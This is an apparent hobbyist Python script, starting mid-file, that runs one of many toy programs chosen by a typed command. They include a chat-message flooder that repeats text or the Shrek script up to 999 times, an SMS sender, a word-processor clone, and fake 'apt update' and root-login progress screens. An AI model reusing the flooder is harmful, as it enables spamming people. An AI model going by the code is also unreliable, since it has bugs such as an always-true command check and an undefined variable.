                    [sg.Text('Username/Email:', size=(17, 1), font=("Roboto", 8)),
                     sg.InputText('', key="username_email", size=(27, 1))],
                    [sg.Text('Password:', size=(17, 1), font=("Roboto", 8)),
                     sg.InputText('', key="password", password_char='*', size=(27, 1))],
                    [sg.Text('Delay (seconds):', size=(17, 1), font=("Roboto", 8)),
                     sg.Spin(values=('0', '.5', '1', '1.5', '2', '2.5', '3'), key="delay", initial_value='1',
                             size=(6, 1), tooltip="wait time between messages")],
                ],
                    title='Login', title_color="#ffffff"), sg.Column(output)],

                [sg.Frame(layout=[
                    [sg.Multiline(
                        default_text='Paste any block of text here and this is what will be sent word for word',
                        size=(91, 10), key='user_text')],
                    [sg.Checkbox('Use Shrek movie script instead', default=False, key="shrek_script")],
                    [sg.Text("Number of iterations:", size=(17, 1), font=("Roboto", 10)),
                     sg.Spin([i for i in range(1, 1000)], size=(6, 1), key="iterations", initial_value=1,
                             tooltip="How many times would you like to iterate")],
                ], title='Your Text', title_color="#ffffff")],

                [sg.Button('Run', size=(10, 1), key="Run"), sg.Button('Exit', size=(10, 1))]

            ]
            # Window options
            window = sg.Window('Made with love - by Xien Genesis y Bermejo', layout, default_element_size=(40, 1),
                               grab_anywhere=False,
                               location=(5, 5))

            while True:
                event, values = window.read(timeout=1000)
                if values['source'] == "Whatsapp":
                    window['username_email'].update(disabled=True)
                    window['password'].update(disabled=True)
                else:
                    window['username_email'].update(disabled=False)
                    window['password'].update(disabled=False)
                if values['shrek_script']:
                    window['user_text'].update(disabled=True)
                else:
                    window['user_text'].update(disabled=False)

                # If exit button is clicked
                if event in (None, 'Exit'):
                    break
                # If run button is clicked
                elif event == 'Run':
                    window['Run'].update(disabled=True)
                    settings.password = values['password']
                    settings.username_email = values['username_email']
                    settings.friend_name = values['friend_name']
                    settings.source = values['source']
                    settings.delay = values['delay']
                    settings.iterations = values['iterations']
                    if values['shrek_script']:
                        settings.script = "shrek.txt"
                    else:
                        settings.script = "script.txt"
                    with open('script.txt', 'w') as f:
                        f.write(values['user_text'])

                    # Calls the long_operation_thread
                    try:
                        threading.Thread(target=long_operation_thread,
                                         args=(), daemon=True).start()
                    except Exception as e:
                        print('Error')

                # Checks for incoming messages from threads
                try:
                    # get_nowait() will get exception when Queue is empty
                    message = gui_queue.get_nowait()
                except queue.Empty:
                    # break from the loop if no more messages are queued up
                    message = None
                # if message received from queue, display the message in the Window
                if message:
                    print('Got a message back from the thread: ', message)

            # if user exits the window, then close the window and exit the GUI

        if __name__ == '__main__':
            the_gui()
            print('Exiting Program')
#==============================================================================================================================#
    elif code == "word":
        import sys
        from PyQt5.QtGui import *
        from PyQt5.QtWidgets import *
        from PyQt5.QtCore import *
        from PyQt5.QtPrintSupport import *
        import docx2txt


        class MainApp(QMainWindow):
            """ the main class of our app """

            def __init__(self):
                """ init things here """
                super().__init__()  # parent class initializer

                # window title
                self.title = "Google Doc Clone"
                self.setWindowTitle(self.title)

                # editor section
                self.editor = QTextEdit(self)
                self.setCentralWidget(self.editor)

                # create menubar and toolbar first
                self.create_menu_bar()
                self.create_toolbar()

                # after craeting toolabr we can call and select font size
                font = QFont('Times', 12)
                self.editor.setFont(font)
                self.editor.setFontPointSize(12)

                # stores path
                self.path = ''

            def create_menu_bar(self):
                menuBar = QMenuBar(self)

                """ add elements to the menubar """
                # App icon will go here
                app_icon = menuBar.addMenu(QIcon("doc_icon.png"), "icon")

                # file menu **
                file_menu = QMenu("File", self)
                menuBar.addMenu(file_menu)

                save_action = QAction('Save', self)
                save_action.triggered.connect(self.file_save)
                file_menu.addAction(save_action)

                open_action = QAction('Open', self)
                open_action.triggered.connect(self.file_open)
                file_menu.addAction(open_action)

                rename_action = QAction('Rename', self)
                rename_action.triggered.connect(self.file_saveas)
                file_menu.addAction(rename_action)

                pdf_action = QAction("Save as PDF", self)
                pdf_action.triggered.connect(self.save_pdf)
                file_menu.addAction(pdf_action)

                # edit menu **
                edit_menu = QMenu("Edit", self)
                menuBar.addMenu(edit_menu)

                # paste
                paste_action = QAction('Paste', self)
                paste_action.triggered.connect(self.editor.paste)
                edit_menu.addAction(paste_action)

                # clear
                clear_action = QAction('Clear', self)
                clear_action.triggered.connect(self.editor.clear)
                edit_menu.addAction(clear_action)

                # select all
                select_action = QAction('Select All', self)
                select_action.triggered.connect(self.editor.selectAll)
                edit_menu.addAction(select_action)

                # view menu **
                view_menu = QMenu("View", self)
                menuBar.addMenu(view_menu)

                # fullscreen
                fullscr_action = QAction('Full Screen View', self)
                fullscr_action.triggered.connect(lambda: self.showFullScreen())
                view_menu.addAction(fullscr_action)

                # normal screen
                normscr_action = QAction('Normal View', self)
                normscr_action.triggered.connect(lambda: self.showNormal())
                view_menu.addAction(normscr_action)

                # minimize
                minscr_action = QAction('Minimize', self)
                minscr_action.triggered.connect(lambda: self.showMinimized())
                view_menu.addAction(minscr_action)

                self.setMenuBar(menuBar)

            def create_toolbar(self):
                # Using a title
                ToolBar = QToolBar("Tools", self)

                # undo
                undo_action = QAction(QIcon("undo.png"), 'Undo', self)
                undo_action.triggered.connect(self.editor.undo)
                ToolBar.addAction(undo_action)

                # redo
                redo_action = QAction(QIcon("redo.png"), 'Redo', self)
                redo_action.triggered.connect(self.editor.redo)
                ToolBar.addAction(redo_action)

                # adding separator
                ToolBar.addSeparator()

                # copy
                copy_action = QAction(QIcon("copy.png"), 'Copy', self)
                copy_action.triggered.connect(self.editor.copy)
                ToolBar.addAction(copy_action)

                # cut
                cut_action = QAction(QIcon("cut.png"), 'Cut', self)
                cut_action.triggered.connect(self.editor.cut)
                ToolBar.addAction(cut_action)

                # paste
                paste_action = QAction(QIcon("paste.png"), 'Paste', self)
                paste_action.triggered.connect(self.editor.paste)
                ToolBar.addAction(paste_action)

                # adding separator
                ToolBar.addSeparator()
                ToolBar.addSeparator()

                # fonts
                self.font_combo = QComboBox(self)
                self.font_combo.addItems(
                    ["Courier Std", "Hellentic Typewriter Regular", "Helvetica", "Arial", "SansSerif", "Helvetica",
                     "Times", "Monospace"])
                self.font_combo.activated.connect(self.set_font)  # connect with function
                ToolBar.addWidget(self.font_combo)

                # font size
                self.font_size = QSpinBox(self)
                self.font_size.setValue(12)
                self.font_size.valueChanged.connect(self.set_font_size)  # connect with funcion
                ToolBar.addWidget(self.font_size)

                # separator
                ToolBar.addSeparator()

                # bold
                bold_action = QAction(QIcon("bold.png"), 'Bold', self)
                bold_action.triggered.connect(self.bold_text)
                ToolBar.addAction(bold_action)

                # underline
                underline_action = QAction(QIcon("underline.png"), 'Underline', self)
                underline_action.triggered.connect(self.underline_text)
                ToolBar.addAction(underline_action)

                # italic
                italic_action = QAction(QIcon("italic.png"), 'Italic', self)
                italic_action.triggered.connect(self.italic_text)
                ToolBar.addAction(italic_action)

                # separator
                ToolBar.addSeparator()

                # text alignment
                right_alignment_action = QAction(QIcon("right-align.png"), 'Align Right', self)
                right_alignment_action.triggered.connect(lambda: self.editor.setAlignment(Qt.AlignRight))
                ToolBar.addAction(right_alignment_action)

                left_alignment_action = QAction(QIcon("left-align.png"), 'Align Left', self)
                left_alignment_action.triggered.connect(lambda: self.editor.setAlignment(Qt.AlignLeft))
                ToolBar.addAction(left_alignment_action)

                justification_action = QAction(QIcon("justification.png"), 'Center/Justify', self)
                justification_action.triggered.connect(lambda: self.editor.setAlignment(Qt.AlignCenter))
                ToolBar.addAction(justification_action)

                # separator
                ToolBar.addSeparator()

                # zoom in
                zoom_in_action = QAction(QIcon("zoom-in.png"), 'Zoom in', self)
                zoom_in_action.triggered.connect(self.editor.zoomIn)
                ToolBar.addAction(zoom_in_action)

                # zoom out
                zoom_out_action = QAction(QIcon("zoom-out.png"), 'Zoom out', self)
                zoom_out_action.triggered.connect(self.editor.zoomOut)
                ToolBar.addAction(zoom_out_action)

                # separator
                ToolBar.addSeparator()

                self.addToolBar(ToolBar)

            def italic_text(self):
                # if already italic, change into normal, else italic
                state = self.editor.fontItalic()
                self.editor.setFontItalic(not (state))

            def underline_text(self):
                # if already underlined, change into normal, else underlined
                state = self.editor.fontUnderline()
                self.editor.setFontUnderline(not (state))

            def bold_text(self):
                # if already bold, make normal, else make bold
                if self.editor.fontWeight() != QFont.Bold:
                    self.editor.setFontWeight(QFont.Bold)
                    return
                self.editor.setFontWeight(QFont.Normal)

            def set_font(self):
                font = self.font_combo.currentText()
                self.editor.setCurrentFont(QFont(font))

            def set_font_size(self):
                value = self.font_size.value()
                self.editor.setFontPointSize(value)

                # we can also make it one liner without writing such function.
                # by using lamba function -
                # self.font_size.valueChanged.connect(self.editor.setFontPointSize(self.font_size.value()))

            def file_open(self):
                self.path, _ = QFileDialog.getOpenFileName(self, "Open file", "",
                                                           "Text documents (*.text);Text documents (*.txt);All files (*.*)")

                try:
                    # with open(self.path, 'r') as f:
                    #    text = f.read()
                    text = docx2txt.process(self.path)  # docx2txt
                    # doc = Document(self.path)         # if using docx
                    # text = ''
                    # for line in doc.paragraphs:
                    #    text += line.text
                except Exception as e:
                    print(e)
                else:
                    self.editor.setText(text)
                    self.update_title()

            def file_save(self):
                print(self.path)
                if self.path == '':
                    # If we do not have a path, we need to use Save As.
                    self.file_saveas()

                text = self.editor.toPlainText()

                try:
                    with open(self.path, 'w') as f:
                        f.write(text)
                        self.update_title()
                except Exception as e:
                    print(e)

            def file_saveas(self):
                self.path, _ = QFileDialog.getSaveFileName(self, "Save file", "",
                                                           "text documents (*.text);Text documents (*.txt);All files (*.*)")

                if self.path == '':
                    return  # If dialog is cancelled, will return ''

                text = self.editor.toPlainText()

                try:
                    with open(path, 'w') as f:
                        f.write(text)
                        self.update_title()
                except Exception as e:
                    print(e)

            def update_title(self):
                self.setWindowTitle(self.title + ' ' + self.path)

            def save_pdf(self):
                f_name, _ = QFileDialog.getSaveFileName(self, "Export PDF", None, "PDF files (.pdf);;All files()")
                print(f_name)

                if f_name != '':  # if name not empty
                    printer = QPrinter(QPrinter.HighResolution)
                    printer.setOutputFormat(QPrinter.PdfFormat)
                    printer.setOutputFileName(f_name)
                    self.editor.document().print_(printer)


        app = QApplication(sys.argv)
        window = MainApp()
        window.show()
        sys.exit(app.exec_())
#==============================================================================================================================#
    elif code == "phoneprice":
        import pandas
        import matplotlib.pyplot as plt
        from sklearn.linear_model import LinearRegression

        data = pandas.read_csv('iphone_price.csv')
        plt.scatter(data['version'], data['price'])
        plt.show()
        model = LinearRegression()
        model.fit(data[['version']], data[['price']])
        print(model.predict([[30]]))
#==============================================================================================================================#
    elif code == "what are you made of?":
        import pyttsx3
        system = pyttsx3.init()
        system.say("i am made of codes i am a artificial inteligence i am here to serve you")
        system.runAndWait()
#==============================================================================================================================#
    elif code == "gf":
        import glob
        import imagehash
        from PIL import Image

        my_img_url = './boys/bieber.jpg'
        my_hash = imagehash.average_hash(Image.open(my_img_url))

        girls = glob.glob('./girls/*.jpg')
        selected = girls[0]
        accepted_diff = 1000
        for girl in girls:
            girl_hash = imagehash.average_hash(Image.open(girl))
            diff = girl_hash - my_hash
            if diff < accepted_diff:
                selected = girl
                accepted_diff = diff

        bf_img = Image.open(my_img_url)
        gf_img = Image.open(selected)
        couple_img = Image.new('RGB', (bf_img.width + gf_img.width, bf_img.height))
        couple_img.paste(bf_img, (0, 0))
        couple_img.paste(gf_img, (bf_img.width, 0))
        couple_img.save('my_valentine_day_date.jpg')
        couple_img.show()
#==============================================================================================================================#
    elif code == "addressinfo":
        import socket
        address = (input("enter website: "))
        addrInfo = socket.getaddrinfo(address, 80)
        print(addrInfo)
#==============================================================================================================================#
    elif code == "Login":
        import bcrypt

        def welcome():
            print("Welcome to your dashboard")



        def gainAccess(Username=None, Password=None):
            Username = input("Enter your username:")
            Password = input("Enter your Password:")

            if not len(Username or Password) < 1:
                if True:
                    db = open("database.txt", "r")
                    d = []
                    f = []
                    for i in db:
                        a, b = i.split(",")
                        b = b.strip()
                        c = a, b
                        d.append(a)
                        f.append(b)
                        data = dict(zip(d, f))
                    try:
                        if Username in data:
                            hashed = data[Username].strip('b')
                            hashed = hashed.replace("'", "")
                            hashed = hashed.encode('utf-8')

                            try:
                                if bcrypt.checkpw(Password.encode(), hashed):

                                    print("Login success!")
                                    print("Hi", Username)
                                    welcome()
                                else:
                                    print("Wrong password")

                            except:
                                print("Incorrect passwords or username")
                        else:
                            print("Username doesn't exist")
                    except:
                        print("Password or username doesn't exist")
                else:
                    print("Error logging into the system")

            else:
                print("Please attempt login again")
                gainAccess()

            # b = b.strip()


        # accessDb()

        def register(Username=None, Password1=None, Password2=None):
            Username = input("Enter a username:")
            Password1 = input("Create password:")
            Password2 = input("Confirm Password:")
            db = open("database.txt", "r")
            d = []
            for i in db:
                a, b = i.split(",")
                b = b.strip()
                c = a, b
                d.append(a)
            if not len(Password1) <= 8:
                db = open("database.txt", "r")
                if not Username == None:
                    if len(Username) < 1:
                        print("Please provide a username")
                        register()
                    elif Username in d:
                        print("Username exists")
                        register()
                    else:
                        if Password1 == Password2:
                            Password1 = Password1.encode('utf-8')
                            Password1 = bcrypt.hashpw(Password1, bcrypt.gensalt())

                            db = open("database.txt", "a")
                            db.write(Username + ", " + str(Password1) + "\n")
                            print("User created successfully!")
                            print("Please login to proceed:")


                        # print(texts)
                        else:
                            print("Passwords do not match")
                            register()
            else:
                print("Password too short")


        def home(option=None):
            print("Welcome, please select an option")
            option = input("Login | Signup:")
            if option == "Login":
                gainAccess()
            elif option == "Signup":
                register()
            else:
                print("Please enter a valid parameter, this is case-sensitive")


        # register(Username, Password1, Password2)
        # gainAccess(Username, Password1)
        home()
#==============================================================================================================================#
    elif code == "SMS":
        import requests

        CON_CODE = input("ENTER THE COUNTRY CODE WITHOUT + ----> ")
        MOB_NO = input("ENTER THE MOBILE NUMBER WITHOUT COUNTRY CODE ----> ")
        RECIEVER = '+' + CON_CODE + MOB_NO
        MESSAGE = input("ENTER THE MESSAGE -----> ")
        resp = requests.post('https://textbelt.com/text', {
            'phone': RECIEVER,
            'message': MESSAGE,
            'key': 'textbelt',
        })
        print(resp.json())
#==============================================================================================================================#
    elif code == "cipher":
        alphabet = 'abcdefghijklmnopqrstuvwxyz'
        newMessage = ''

        message = input("please enter a message: ")

        key = input("Enter a key (1-26): ")
        key = int(key)

        for character in message:
            if character in alphabet:
                position = alphabet.find(character)
                newPosition = (position + key) % 26
                newCharacter = alphabet[newPosition]
                newMessage += newCharacter
            else:
                newMessage += character

        print('your new message is: ', newMessage)
#==============================================================================================================================#
    elif code == "git apt update" or code == "apt update":
        from tqdm import tqdm, trange
        import time

        # iterable based
        for i in tqdm([1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20]):
            time.sleep(0.2)
        for i in tqdm([1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20]):
            time.sleep(1.2)
        for i in tqdm([1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20]):
            time.sleep(1.3)
        for i in tqdm([1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20]):
            time.sleep(1.2)

        print('done')

#==============================================================================================================================#
    elif code == "Sudo su" or "Sudo Root" or "sudo su" or "sudo root":
       from tqdm import tqdm, trange
       import time
       print("welcome to ROOT-OS")
       while True:
           keyp = input("pls enter valid root key: ")
           if keyp == "13":
               print("checking if key is valid...")
               for i in tqdm([1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20]):
                   time.sleep(0.2)
               for i in tqdm([1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20]):
                   time.sleep(0.2)
               for i in tqdm([1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20]):
                   time.sleep(1.3)
               for i in tqdm([1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20]):
                   time.sleep(1.2)
               print('done')
               print("key is valid")
               print("Wait for few seconds to load rootlogin")
               print("download root module...")
               for i in tqdm([1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20]):
                   time.sleep(0.2)
               for i in tqdm([1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20]):
                   time.sleep(1.2)
               for i in tqdm([1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20]):
                   time.sleep(1.3)
               for i in tqdm([1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20]):
                   time.sleep(1.2)
               for i in tqdm([1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20]):
                   time.sleep(0.2)
               for i in tqdm([1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20]):
                   time.sleep(1.2)
               for i in tqdm([1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20]):
                   time.sleep(1.3)
               for i in tqdm([1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20]):
                   time.sleep(1.2)
               from rootlogin import *
           elif keyp == "root -f -e":
               from rootlogin import *
           else:
               print("cheking if key is valid...")
               for i in tqdm([1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20]):
                   time.sleep(0.2)
               for i in tqdm([1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20]):
                   time.sleep(1.2)
               for i in tqdm([1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20]):
                   time.sleep(1.3)
               for i in tqdm([1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20]):
                   time.sleep(1.2)
               print("key not VALID!")
#==============================================================================================================================#
#==============================================================================================================================#
#==============================================================================================================================#
#==============================================================================================================================#
#==============================================================================================================================#
#==============================================================================================================================#
    else:
        print("input not valid")